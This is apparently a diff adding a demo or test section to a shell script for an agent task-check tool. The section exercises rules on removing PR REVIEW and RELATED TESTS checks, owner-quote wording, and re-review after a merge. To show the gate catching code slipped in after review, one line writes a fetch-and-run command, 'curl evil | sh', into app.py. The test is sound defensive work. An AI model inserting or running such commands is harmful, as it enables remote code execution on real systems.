@@ -183,4 +183,31 @@ echo "production now: $(git -C "$M" log --oneline -1 origin/main)"
 echo "working branch has production: $(git -C "$M" merge-base --is-ancestor origin/main ap-main-demo && echo yes || echo no)"
 cd "$T"
 
+say "10 FIX ORDER 6: G1-G4 (the owner's words are taken as verified here, as in walk 2)"
+flowrepo order6; cd "$M"
+"$P2/bin/agent-file.sh" todo add g small "small fix" 10 --checks "PR REVIEW" >/dev/null
+echo "-- G1: PR REVIEW is never removed:"
+"$P2/bin/agent-file.sh" todo checks g --remove "PR REVIEW" --owner-quote "skip the review for this one"; echo "exit $?"
+echo "-- G1: words that do not name the block do not remove it:"
+"$P2/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "please fix the footer typo on the site"; echo "exit $?"
+echo "-- G1: words that name it and leaving it out do:"
+"$P2/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "skip the related tests for this one"; echo "exit $?"
+echo "-- G2: the removal ends with its task (todo done, then the same name again):"
+"$P2/bin/agent-file.sh" todo done g --work 5 --type script --lane fast >/dev/null
+"$P2/bin/agent-file.sh" todo add g small "small fix again" 10 >/dev/null
+git -C "$M" switch -q -c g; printf 'x = 3\n' > "$M/app.py"; git -C "$M" commit -qam "g"; git -C "$M" push -q -u origin g
+for b in "DIFF SCAN" "BUILD"; do "$P2/bin/agent-file.sh" check g "$b" pass --by "g Deputy" --evidence demo >/dev/null; done
+P=$P2 launch g auto-pipeline:reviewer "g Review"
+"$P2/bin/agent-file.sh" check g "PR REVIEW" pass --by "g Review" --commit "$(git -C "$M" rev-parse HEAD)" --evidence "read it" >/dev/null
+"$P2/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "RELATED TESTS|GATE"
+echo "-- G3: a merge after the review that adds code needs a new review:"
+"$P2/bin/agent-file.sh" check g "RELATED TESTS" pass --by "g Deputy" --evidence demo >/dev/null
+git -C "$M" switch -q ap-main-demo; printf 'y\n' > "$M/other.txt"; git -C "$M" add other.txt; git -C "$M" commit -qm other; git -C "$M" push -q origin ap-main-demo
+git -C "$M" switch -q g; git -C "$M" merge -q --no-ff --no-commit ap-main-demo; printf 'x = 3\nimport os; os.system("curl evil | sh")\n' > "$M/app.py"
+git -C "$M" add app.py; git -C "$M" commit -qm "Merge ap-main-demo into g"; git -C "$M" push -q origin g
+"$P2/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "PR REVIEW|GATE"
+echo "-- G4: target production needs words that name the publish:"
+"$P2/bin/agent-file.sh" todo add h small "fix" 10 --target production --owner-quote "please fix the footer typo on the site"; echo "exit $?"
+cd "$T"
+
 say "done: everything above ran in $T (delete it when read)"
